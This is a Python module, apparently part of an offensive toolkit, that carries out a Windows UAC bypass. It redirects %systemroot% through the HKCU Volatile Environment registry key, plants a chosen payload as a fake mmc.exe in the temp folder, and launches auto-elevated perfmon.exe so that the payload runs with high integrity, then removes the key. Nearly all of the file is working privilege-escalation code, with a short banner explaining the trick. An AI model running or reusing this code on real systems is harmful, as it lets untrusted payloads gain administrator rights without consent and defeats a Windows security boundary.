"""
Works from: Windows 7
Fixed in: Windows 10 RS3 (16299)
"""
import os
import time
import shutil
import _winreg
import tempfile
from core.prints import *

def perfmon(payload):
	print """
 -------------------------------------------------------------
 perfmon.exe is an auto-elevated binary that executes
 mmc.exe with the path to "perfmon.msc" as commandline
 argument. It is there to auto-elevate only Performance
 Monitor, but the Management Console itself does not
 auto-elevate.

 Define your own %systemroot% in HKCU\Volatile Environment
 and perfmon.exe will look for mmc.exe there instead. We
 can just name our payload "mmc.exe" and it will be
 executed with high IL.

 When everything worked correctly, the payload should be
 spawned with high IL.
 -------------------------------------------------------------
 """
 
	print_info("Payload: {}".format(payload))
	print_info("Attempting to change %systemroot% through volatile environment")
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Volatile Environment"))
								
		_winreg.SetValueEx(key,
				"SYSTEMROOT",
				0,
				_winreg.REG_SZ,
				tempfile.gettempdir())
		_winreg.CloseKey(key)
		print_success("Registry %systemroot% key was created")
	except Exception as error:
		print_error("Unable to create %systemroot% key")
		return False

	try:
		if ((os.path.exists(os.path.join(tempfile.gettempdir(),"system32"))) == True):
			if ((os.path.isfile(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))) == True):
				try:
					os.remove(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
				except Exception as error:
					return False
				try:
					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
				except Exception as error:
					return False
			else:
				try:
					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
				except Exception as error:
					return False
		else:
			pass
	except Exception as error:
		return False

	try:
		os.makedirs(os.path.join(tempfile.gettempdir(),"system32"))
		print_success("Successfully created temp directory")
	except Exception as error:
		print_error("Unable to create folder")
		return False
	
	print_info("Pausing for 5 seconds before copy")
	time.sleep(5)

	try:
		shutil.copy(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
		print_success("Successfully copied: {} to: {}".format(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe")))
	except shutil.Error as error:
		print_error("Unable to copy: {}".format(payload))
		return False
	except IOError as error:
		print_error("Unable to copy: {}".format(payload))
		return False

	print_info("Pausing for 5 seconds before executing")
	time.sleep(5)

	print_info("Attempting to create process")
	try:
		if (os.system("perfmon.exe") == 0):
			print_success("Process started successfully")
		else:
			print_error("Problem creating process")
			return False
	except Exception as error:
		print_error("Problem creating process: {}".format(error))
		return False

	print_info("Pausing for 5 seconds before cleaning")	
	time.sleep(5)

	print_info("Attempting to remove %systemroot% registry key")	
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Volatile Environment"))
		_winreg.DeleteValue(key,
				"SYSTEMROOT")
		print_success("Registry %systemroot% key was deleted")
	except Exception as error:
		print_error("Unable to delete %systemroot% registry key")
		return False
